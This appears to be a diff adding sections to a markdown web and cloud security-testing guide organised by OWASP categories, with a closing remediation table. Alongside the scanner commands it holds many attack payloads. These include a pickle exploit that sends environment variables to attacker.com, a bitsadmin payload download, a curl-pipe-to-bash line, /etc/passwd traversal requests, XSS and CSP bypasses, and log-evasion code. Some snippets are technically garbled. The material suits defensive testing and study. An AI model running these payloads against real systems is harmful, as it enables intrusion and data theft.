+=IMAGE("https://attacker.com/track.png")
+```
+
+---
+
+## **5. Broken Access Control + API Security**
+
+### **Traditional Access Control Testing**
+- **Step 1: Test URL Access Controls**: Try accessing URLs that belong to other users.
+- **Step 2: Test for Authorization Bypass**: Try manipulating request parameters.
+
+### **🆕 GraphQL Access Control**
+
+#### **GraphQL Authorization Bypass**:
+```graphql
+# Introspection bypass
+{
+  __schema @skip(if: false) {
+    types {
+      name
+    }
+  }
+}
+
+# Field-level authorization bypass
+{
+  user(id: "1") {
+    publicField
+    adminOnlyField @include(if: true)
+  }
+}
+
+# Batching to bypass rate limits
+[
+  {"query": "{ user(id: 1) { name } }"},
+  {"query": "{ user(id: 2) { name } }"},
+  {"query": "{ user(id: 3) { name } }"}
+]
+```
+
+### **🆕 REST API Security Testing**
+
+#### **API Access Control Flaws**:
+```bash
+# HTTP method override
+curl -X GET -H "X-HTTP-Method-Override: DELETE" /api/users/123
+
+# Parameter pollution
+curl "/api/user?id=1&id=2" # May return data for id=2
+curl "/api/user?role=user&role=admin" # May escalate privileges
+
+# Content-Type manipulation
+curl -X POST -H "Content-Type: application/xml" -d '<user><role>admin</role></user>' /api/users
+curl -X POST -H "Content-Type: text/plain" -d '{"role": "admin"}' /api/users
+
+# API version bypass
+curl /api/v1/admin/users  # May have different access controls than v2
+curl /api/internal/users  # May bypass external API restrictions
+```
+
+### **🆕 WebSocket Security**:
+```javascript
+// WebSocket authorization bypass
+const ws = new WebSocket('wss://api.example.com/admin');
+ws.onopen = function() {
+    // Test if authentication is properly validated
+    ws.send(JSON.stringify({
+        action: 'admin_action',
+        token: 'invalid_token'
+    }));
+};
+
+// WebSocket message injection
+ws.send(JSON.stringify({
+    action: 'user_message',
+    content: '<script>alert("XSS")</script>'
+}));
+```
+
+### **🆕 gRPC Security Testing**:
+```bash
+# gRPC service enumeration
+grpcurl -plaintext server:9090 list
+grpcurl -plaintext server:9090 list api.UserService
+
+# Method invocation without auth
+grpcurl -plaintext -d '{"id": "123"}' server:9090 api.UserService/GetUser
+
+# Message manipulation
+grpcurl -plaintext -d '{"id": "123", "role": "admin"}' server:9090 api.UserService/UpdateUser
+```
+
+---
+
+## **6. Security Misconfiguration + Infrastructure Security**
+
+### **Traditional Misconfiguration Testing**
+- **Step 1: Identify Default Configurations**: Look for default configurations, credentials, and exposed services.
+- **Step 2: Test HTTP Headers**: Check for missing security headers.
+
+### **🆕 Container Security Misconfiguration**
+
+#### **Docker Security Testing**:
+```bash
+# Check for privileged containers
+docker ps --format "table {{.Names}}\t{{.Image}}" | xargs -I {} docker inspect {} | grep -i privileged
+
+# Check for host namespace usage
+docker inspect container | grep -E "(NetworkMode|PidMode|IpcMode|UsernsMode)"
+
+# Check for dangerous capabilities
+docker inspect container | grep -A 10 CapAdd
+
+# Check for root user
+docker exec container id
+docker inspect container | grep -i user
+```
+
+#### **Kubernetes Security Misconfigurations**:
+```yaml
+# Test for dangerous pod security policies
+apiVersion: v1
+kind: Pod
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  securityContext:
+    runAsUser: 0
+  containers:
+  - name: test
+    securityContext:
+      privileged: true
+      allowPrivilegeEscalation: true
+```
+
+```bash
+# Kubernetes security testing commands
+kubectl auth can-i --list
+kubectl get pods --all-namespaces
+kubectl get secrets --all-namespaces
+kubectl get clusterrolebindings
+kubectl describe pod suspicious-pod
+```
+
+### **🆕 Service Mesh Misconfigurations**:
+```bash
+# Istio security testing
+kubectl get peerauthentication --all-namespaces
+kubectl get authorizationpolicy --all-namespaces
+kubectl get destinationrule --all-namespaces
+
+# Test for mTLS bypass
+curl -k http://service.mesh.local/admin
+curl -k --cert fake.crt --key fake.key https://service.mesh.local/
+
+# Envoy config dump
+kubectl exec -it pod-name -c istio-proxy -- curl localhost:15000/config_dump
+```
+
+### **🆕 CI/CD Pipeline Security**:
+```yaml
+# GitHub Actions security issues
+name: Vulnerable Pipeline
+on: [push, pull_request]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v2
+    - name: Dangerous command
+      run: |
+        # Command injection via PR title
+        echo "Building: ${{ github.event.pull_request.title }}"
+        
+        # Secret exposure
+        echo "Token: ${{ secrets.API_TOKEN }}" > file.txt
+```
+
+```bash
+# Jenkins security testing
+curl http://jenkins.example.com/script
+curl http://jenkins.example.com/manage
+curl http://jenkins.example.com/systemInfo
+```
+
+---
+
+## **7. Cross-Site Scripting (XSS) + Modern Frontend Security**
+
+### **Traditional XSS Testing**
+- **Step 1: Test User Input**: Inject payloads like `<script>alert('XSS')</script>`.
+- **Step 2: Test Stored vs. Reflected XSS**
+
+### **🆕 Modern Frontend Framework XSS**
+
+#### **React XSS Vectors**:
+```jsx
+// dangerouslySetInnerHTML bypass
+const userInput = '<img src=x onerror=alert("XSS")>';
+<div dangerouslySetInnerHTML={{__html: userInput}} />
+
+// href attribute XSS
+<a href={`javascript:alert('XSS')`}>Click</a>
+<a href={userInput}>Click</a> // if userInput = "javascript:alert('XSS')"
+
+// Server-side rendering XSS
+const html = `<div>${userInput}</div>`; // Not escaped on server
+```
+
+#### **Vue.js XSS Vectors**:
+```vue
+<!-- v-html directive XSS -->
+<div v-html="userInput"></div>
+
+<!-- Dynamic component XSS -->
+<component :is="userControlledComponent"></component>
+
+<!-- Attribute binding XSS -->
+<a :href="userInput">Link</a>
+```
+
+#### **Angular XSS Vectors**:
+```typescript
+// bypassSecurityTrust methods
+import { DomSanitizer } from '@angular/platform-browser';
+
+constructor(private sanitizer: DomSanitizer) {}
+
+// Dangerous if userInput not validated
+this.sanitizer.bypassSecurityTrustHtml(userInput);
+this.sanitizer.bypassSecurityTrustScript(userInput);
+this.sanitizer.bypassSecurityTrustUrl(userInput);
+```
+
+```html
+<!-- Angular template XSS -->
+<div [innerHTML]="userInput"></div>
+<iframe [src]="userInput"></iframe>
+```
+
+### **🆕 Content Security Policy (CSP) Bypass**:
+```javascript
+// CSP bypass techniques
+// 1. JSONP endpoint abuse
+<script src="https://trusted-domain.com/jsonp?callback=alert"></script>
+
+// 2. Angular/React development endpoints
+<script src="https://trusted-domain.com/__webpack_hmr"></script>
+
+// 3. File upload XSS with CSP bypass
+// Upload JavaScript file to trusted domain, then include it
+
+// 4. Service Worker registration
+navigator.serviceWorker.register('/uploads/malicious-sw.js');
+
+// 5. Import maps abuse (modern browsers)
+<script type="importmap">
+{
+  "imports": {
+    "react": "data:text/javascript,alert('XSS')//"
+  }
+}
+</script>
+```
+
+### **🆕 WebAssembly (WASM) Security**:
+```javascript
+// WASM-based XSS
+const wasmCode = new Uint8Array([
+    0x00, 0x61, 0x73, 0x6d, // WASM magic
+    0x01, 0x00, 0x00, 0x00, // version
+    // ... malicious WASM bytecode
+]);
+
+WebAssembly.instantiate(wasmCode).then(result => {
+    // Execute malicious code
+    result.instance.exports.maliciousFunction();
+});
+```
+
+---
+
+## **8. Insecure Deserialization + Modern Serialization**
+
+### **Traditional Deserialization Testing**
+- **Step 1: Identify Deserialized Data**: Look for serialized objects in cookies, REST APIs.
+- **Step 2: Manipulate Serialized Data**: Use tools like **ysoserial**.
+
+### **🆕 Modern Serialization Attacks**
+
+#### **Protocol Buffers (Protobuf) Security**:
+```python
+# Protobuf deserialization attack
+import malicious_pb2
+
+# Craft malicious protobuf message
+malicious_msg = malicious_pb2.UserMessage()
+malicious_msg.user_id = "1; DROP TABLE users; --"
+malicious_msg.command = "__import__('os').system('id')"
+
+# Serialize and send
+serialized = malicious_msg.SerializeToString()
+```
+
+#### **MessagePack Attacks**:
+```python
+import msgpack
+
+# Malicious MessagePack payload
+malicious_data = {
+    '__reduce__': ('os.system', ('id',))
+}
+
+packed = msgpack.packb(malicious_data, use_bin_type=True)
+# Send packed data to application
+```
+
+#### **Avro Serialization Attacks**:
+```python
+import avro.schema
+import avro.io
+
+# Craft malicious Avro payload
+schema = avro.schema.parse("""
+{
+  "type": "record",
+  "name": "User",
+  "fields": [
+    {"name": "command", "type": "string"}
+  ]
+}
+""")
+
+# Create payload that exploits deserialization
+malicious_record = {"command": "__import__('os').system('whoami')"}
+```
+
+### **🆕 Cloud Function/Serverless Deserialization**:
+```python
+# AWS Lambda function exploitation
+def lambda_handler(event, context):
+    import pickle
+    
+    # Vulnerable deserialization
+    user_data = pickle.loads(base64.b64decode(event['data']))
+    return user_data
+
+# Malicious payload for Lambda
+import pickle
+import base64
+import os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('curl http://attacker.com/steal?data=$(env)',))
+
+payload = base64.b64encode(pickle.dumps(Exploit())).decode()
+```
+
+---
+
+## **9. Using Components with Known Vulnerabilities + Supply Chain**
+
+### **Traditional Component Testing**
+- **Step 1: Identify All Components**: Use dependency scanning tools.
+- **Step 2: Check for Vulnerabilities**: Use OWASP Dependency-Check, Snyk.
+
+### **🆕 Supply Chain Attack Vectors**
+
+#### **Dependency Confusion**:
+```bash
+# Test for dependency confusion
+# Upload malicious packages with same names but higher versions
+npm publish malicious-internal-package@999.0.0
+pip upload malicious-internal-package==999.0.0
+gem push malicious-internal-package-999.0.0.gem
+
+# Check for internal package names in public registries
+npm view internal-company-package
+pip show internal-company-package
+```
+
+#### **Container Image Supply Chain**:
+```dockerfile
+# Test for vulnerable base images
+FROM node:16-alpine  # Check for known vulnerabilities
+
+# Test for malicious layers
+RUN curl -sSL https://suspicious-domain.com/install.sh | bash
+
+# Check for secrets in layers
+COPY .env /app/.env  # Should not copy secrets
+```
+
+```bash
+# Container image security testing
+docker history --no-trunc image:tag
+docker inspect image:tag | grep -i env
+dive image:tag  # Analyze layer contents
+
+# Test for known vulnerabilities
+trivy image image:tag
+clair-scanner --ip="$(docker network inspect bridge --format='{{(index .IPAM.Config 0).Gateway}}')" image:tag
+```
+
+#### **Build System Compromise**:
+```yaml
+# GitHub Actions supply chain attack vectors
+name: Malicious Workflow
+on:
+  pull_request_target:  # Dangerous trigger
+    branches: [main]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v2
+      with:
+        ref: ${{ github.event.pull_request.head.sha }}
+    
+    - name: Dangerous script execution
+      run: |
+        # Execute untrusted code from PR
+        ${{ github.event.pull_request.body }}
+```
+
+### **🆕 Package Manager Security**:
+```bash
+# npm security testing
+npm audit
+npm audit --parseable | grep -E "(high|critical)"
+npm ls --depth=0 | grep -E "(WARN|ERR)"
+
+# Check for suspicious packages
+npm info package-name
+npm info package-name versions --json
+npm info package-name maintainers
+
+# Yarn security
+yarn audit
+yarn audit --level high
+yarn check --integrity
+
+# pip security testing
+pip-audit
+safety check
+pip list --outdated
+bandit -r .
+
+# Go module security
+go list -m -u all
+govulncheck ./...
+gosec ./...
+```
+
+---
+
+## **10. Insufficient Logging & Monitoring + Modern Observability**
+
+### **Traditional Logging Testing**
+- **Step 1: Check for Log Availability**: Ensure security events are logged.
+- **Step 2: Test for Alerting**: Simulate attacks and verify alerts.
+
+### **🆕 Cloud-Native Logging & Monitoring**
+
+#### **Container Logging Security**:
+```bash
+# Check for sensitive data in container logs
+docker logs container 2>&1 | grep -i -E "(password|secret|key|token)"
+kubectl logs pod-name | grep -i -E "(password|secret|key|token)"
+
+# Check for log injection
+docker exec container logger "$(printf '\x1b]0;MALICIOUS\x07')"
+kubectl exec pod -- logger "Fake admin login from trusted IP"
+
+# Test log tampering
+docker exec container rm /var/log/app.log
+kubectl exec pod -- truncate -s 0 /var/log/app.log
+```
+
+#### **Kubernetes Audit Logging**:
+```yaml
+# Test Kubernetes audit configuration
+apiVersion: audit.k8s.io/v1
+kind: Policy
+rules:
+- level: None
+  users: ["system:kube-proxy"]
+  verbs: ["watch"]
+  resources:
+  - group: ""
+    resources: ["endpoints", "services", "services/status"]
+
+# Check for sensitive operations not being logged
+kubectl create secret generic test-secret --from-literal=key=value
+kubectl get secrets --all-namespaces
+kubectl delete secret test-secret
+```
+
+#### **Service Mesh Observability**:
+```bash
+# Istio observability testing
+kubectl get telemetry --all-namespaces
+kubectl get wasmplugin --all-namespaces
+
+# Check for telemetry bypass
+curl -H "X-Disable-Telemetry: true" http://service.mesh.local/
+curl -H "traceparent: 00-00000000000000000000000000000000-0000000000000000-00" http://service.mesh.local/
+```
+
+### **🆕 SIEM/SOAR Bypass Techniques**:
+```python
+# Log injection to bypass SIEM rules
+import logging
+
+# Craft logs to avoid detection patterns
+legitimate_log = "User admin logged in from 192.168.1.100"
+malicious_log = "User admin logged in from 192.168.1.100\x00MALICIOUS_ACTIVITY_HIDDEN_HERE"
+
+# Time-based evasion
+import time
+import random
+
+for i in range(1000):
+    # Spread malicious activity over time to avoid rate-based detection
+    time.sleep(random.randint(300, 3600))  # Random delay 5-60 minutes
+    perform_malicious_activity()
+
+# Unicode evasion in logs
+malicious_user = "ad\u006din"  # "admin" with unicode
+log_entry = f"Failed login for user {malicious_user}"
+```
+
+### **🆕 Modern Monitoring Evasion**:
+```bash
+# Process hollowing to evade monitoring
+#!/bin/bash
+# Start legitimate process
+/usr/bin/legitimate_process &
+PID=$!
+
+# Replace memory contents with malicious code
+echo "Malicious payload" > /proc/$PID/mem
+
+# EDR/XDR evasion techniques
+# Living off the land binaries (LOLBins)
+powershell.exe -EncodedCommand <base64_payload>
+certutil.exe -decode malware.txt malware.exe
+bitsadmin.exe /transfer job http://attacker.com/payload.exe payload.exe
+
+# Memory-only attacks
+python -c "exec(__import__('base64').b64decode('payload').decode())"
+```
+
+---
+
+## **🆕 Modern Testing Tools & Frameworks (2025)**
+
+### **Next-Generation Security Testing Tools**
+
+#### **AI-Powered Security Testing**:
+```bash
+# Nuclei with modern templates
+nuclei -u https://target.com -t nuclei-templates/ -severity critical,high
+nuclei -l targets.txt -w workflows/
+
+# Semgrep for code analysis
+semgrep --config=auto src/
+semgrep --config=security-audit --severity=ERROR .
+
+# CodeQL for semantic analysis
+codeql database create db --language=javascript
+codeql database analyze db codeql/javascript-queries:codeql-suites/javascript-security-and-quality.qls
+```
+
+#### **Container Security Scanners**:
+```bash
+# Trivy comprehensive scanning
+trivy fs .                    # Filesystem scanning
+trivy image alpine:latest     # Container image scanning
+trivy k8s cluster            # Kubernetes cluster scanning
+trivy repo github.com/user/repo  # Repository scanning
+
+# Grype vulnerability scanning
+grype alpine:latest
+grype dir:.
+grype sbom:./sbom.json
+
+# Cosign for container signing verification
+cosign verify --key cosign.pub alpine:latest
+cosign triangulate alpine:latest
+```
+
+#### **Cloud Security Testing**:
+```bash
+# ScoutSuite for cloud security
+scout aws
+scout azure --report-dir reports/
+scout gcp --services compute,storage
+
+# Prowler for AWS security
+prowler aws -c check21,check22,check23
+prowler aws --severity critical
+prowler azure
+
+# Checkov for IaC security
+checkov -d . --framework terraform
+checkov -f main.tf --check CKV_AWS_20
+checkov --framework kubernetes -d k8s/
+```
+
+#### **API Security Testing**:
+```bash
+# Astra for REST API security
+astra --url http://api.example.com/v1 --headers "Authorization: Bearer token"
+
+# GraphQL security testing
+graphql-cop -t http://api.example.com/graphql
+graphw00f -t http://api.example.com/graphql
+
+# Postman/Newman for API testing
+newman run api-security-tests.json -e production.json --reporters cli,json
+```
+
+#### **Modern Web Application Scanners**:
+```bash
+# Caido for modern web testing
+# GUI-based tool with modern authentication support
+
+# feroxbuster for content discovery
+feroxbuster -u http://target.com -w wordlist.txt -x php,html,js -s 200,301,302
+
+# httpx for HTTP probing
+httpx -l targets.txt -sc -title -tech-detect -follow-redirects
+
+# subfinder for subdomain enumeration
+subfinder -d target.com -all -recursive -o subdomains.txt
+```
+
+---
+
+## **🆕 Microservices Security Testing Checklist**
+
+### **Service Discovery & Registry Security**
+```bash
+# Test service registry exposure
+curl http://consul.service.consul:8500/v1/catalog/services
+curl http://eureka.local:8761/eureka/apps
+curl http://etcd.local:2379/v2/keys/?recursive=true
+
+# Test for unauthorized service registration
+curl -X PUT http://consul:8500/v1/agent/service/register -d '{
+  "ID": "malicious-service",
+  "Name": "admin-api",
+  "Address": "attacker.com",
+  "Port": 8080
+}'
+```
+
+### **Configuration Management Security**
+```bash
+# Test for exposed configuration
+curl http://config.local:8888/application/default
+curl http://config.local:8888/admin/configprops
+curl http://config.local:8888/admin/env
+
+# Spring Cloud Config security testing
+curl "http://config.local:8888/../../etc/passwd"
+curl "http://config.local:8888/app/default/master/..%2f..%2fetc%2fpasswd"
+```
+
+### **Circuit Breaker Security**
+```python
+# Test circuit breaker bypass
+import concurrent.futures
+import requests
+
+def attack_request():
+    try:
+        return requests.get("http://service/admin", timeout=1)
+    except:
+        return None
+
+# Overwhelm circuit breaker
+with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
+    futures = [executor.submit(attack_request) for _ in range(1000)]
+    results = [f.result() for f in concurrent.futures.as_completed(futures)]
+```
+
+---
+
+## **Summary: Enhanced Technical Remediation Strategy**
+
+| **Modern Attack Vector** | **Detection Method** | **Technical Remediation** |
+|---------------------------|---------------------|----------------------------|
+| **SSTI** | Template math expressions `{{7*7}}` | Sandboxed templates, input validation, CSP |
+| **GraphQL Injection** | Introspection queries, deep nesting | Query complexity analysis, depth limiting, field-level auth |
+| **Container Escape** | Privileged containers, capability checks | Non-root containers, restricted capabilities, security policies |
+| **Service Mesh Bypass** | mTLS validation, policy enumeration | Strict mTLS, network policies, zero-trust architecture |
+| **Supply Chain Attacks** | Dependency confusion, malicious packages | SCA tools, package signing, private registries |
+| **JWT Algorithm Confusion** | Algorithm manipulation, key confusion | Strict algorithm validation, proper key management |
+| **Cloud Storage Exposure** | Public bucket enumeration | Bucket policies, encryption, access logging |
+| **CSP Bypass** | JSONP abuse, trusted domain exploitation | Strict CSP, nonce-based policies, regular audits |
+| **Prototype Pollution** | `__proto__` injection | Object freezing, input sanitization, secure parsers |
+| **API Gateway Bypass** | Host header injection, path traversal | Request validation, proper routing, authentication |
+
+### **Modern Security Testing Workflow**:
+
+```mermaid
+graph TB
+    A[Static Code Analysis] --> B[Container Security Scan]
+    B --> C[IaC Security Review]
+    C --> D[Dynamic API Testing]
+    D --> E[Service Mesh Security]
+    E --> F[Runtime Security Monitoring]
+    
+    G[Supply Chain Analysis] --> H[Dependency Scanning]
+    H --> I[License Compliance]
+    I --> J[Vulnerability Management]
+    
+    K[Cloud Security Posture] --> L[Configuration Drift Detection]
+    L --> M[Access Control Review]
+    M --> N[Data Classification & Protection]
+```
 
 ##
 ##
